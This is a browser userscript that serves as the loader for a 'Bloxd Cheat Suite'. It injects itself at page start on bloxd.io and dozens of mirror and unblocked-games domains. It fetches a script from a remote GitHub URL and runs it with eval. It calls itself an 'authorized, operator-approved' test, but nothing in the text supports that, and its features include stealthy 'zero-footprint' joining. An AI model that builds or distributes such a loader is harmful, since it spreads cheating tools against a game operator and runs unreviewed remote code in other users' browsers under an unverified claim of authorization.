// ==UserScript==
// @name         Bloxd Cheat Suite [bloxd io PoC - authorized test]
// @namespace    https://bloxd.io
// @version      v0.4.1
// @description  Authorized vulnerability-test PoC suite for bloxd.io (operator-approved). Per-feature ON/OFF UI, txGovern rate limiting, zero-footprint join. Mirrors the Click Helper distribution scheme (fetch -> eval).
// @author       BCS
// @license      MIT
// @match        *://*.bloxd.io/*
// @match        *://*.bloxd.com/*
// @match        *://*.bloxd.dev/*
// @match        *://*.bloxdhop.io/*
// @match        *://*.eviltower.io/*
// @match        *://*.doodlecube.io/*
// @match        *://*.playbloxd.com/*
// @match        *://*.bloxdk12.com/*
// @match        *://*.bloxdunblocked.*/*
// @match        *://*.unbloxd.*/*
// @match        *://*.buildminecreate.com/*
// @match        *://*.buildhub.*/*
// @match        *://*.skillhub.vip/*
// @match        *://*.classcraft.*/*
// @match        *://*.collabspace.space/*
// @match        *://*.creativebuilding.*/*
// @match        *://*.bedwars.space/*
// @match        *://*.bedwarsonline.net/*
// @match        *://*.iogamesunblocked.com/*
// @match        *://*.unblockedgames.club/*
// @match        *://*.math.wales/*
// @match        *://*.math.cymru/*
// @match        *://*.geometry.com.de/*
// @match        *://*.trigonometry.website/*
// @match        *://*.geometry.quest/*
// @match        *://*.geometries.top/*
// @match        *://*.maths.icu/*
// @match        *://*.geologies.top/*
// @match        *://*.archeology.top/*
// @grant        none
// @run-at       document-start
// ==/UserScript==
/* AUTHORIZED USE ONLY: operator-approved vulnerability test PoC. Delete after the test window ends. */
(() => {
  'use strict';
  // EDIT ME before distribution: replace with the raw URL of YOUR repo's output/script.js
  const BCS_URL = "https://raw.githubusercontent.com/YOUR-USER/YOUR-REPO/main/output/script.js";
  fetch(BCS_URL)
    .then(r => r.ok ? r.text() : Promise.reject(new Error(`HTTP ${r.status}`)))
    .then(eval)
    .catch(e => alert(e.message));
})();
